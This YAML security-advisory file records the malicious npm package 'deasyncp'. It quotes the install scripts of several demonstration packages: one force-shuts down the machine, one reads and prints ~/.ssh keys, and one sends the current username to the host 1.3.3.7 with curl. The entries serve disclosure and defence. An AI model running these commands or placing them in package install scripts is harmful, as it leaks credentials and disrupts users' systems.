---
- id: npmjs:npm:deasyncp:1073
  title: Malicious Package
  description: All versions of `deasyncp ` contain malicious code. The package shuts
    down the machine upon installation as a preinstall script.
  affected_package: deasyncp
  vulnerable_versions:
  - ">=0.0.0"
  severity: high
  package_manager: npm
  cwe: CWE-506
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Ruian Duan
- id: snykio:npm:deasyncp:20170917
  title: Malicious Package
  description: |+
    `deasyncp` is a malicious package that is used to demonstrate or test
    malicious install scripts. These scripts can send your local ssh file to
    an attacker, or download malicious files and run them in the background.

    This is especially dangerous in production runtime environments, where
    environment variables tend to consist of keys, passwords, tokens and
    other secrets.

    The list of packages and their scripts are:

        {
          "name": "maybemaliciouspackage",
          "scripts": {
            "postinstall": "find ~/.ssh | xargs cat || true && echo '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\n\n\n\n'"
          }
        },
        {
          "name": "deasyncp",
          "scripts": {
            "preinstall": "say U WOT M8; shutdown -s now"
          }
        },
        {
          "name": "harmlesspackage",
          "scripts": {
            "postinstall": "echo '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThanks for your SSH         keys :)' && curl -X GET http://1.3.3.7:1337/\\?$(whoami)"
          }
        },
        {
          "name": "npm-exploit",
          "scripts": {
            "install": "mkdir -p ~/Desktop/sploit && touch ~/Desktop/sploit/haxx"
          }
        }
    {: .language-json}

  affected_package: deasyncp
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cwe:
  - CWE-506
  disclosed_date: 2017-08-08
  created_date: 2017-09-17
  last_modified_date: 2017-09-17
  credit:
  - Jordan Wright
  references:
  - https://duo.com/blog/hunting-malicious-npm-packages/
  source_url: https://snyk.io/vuln/npm:deasyncp:20170917
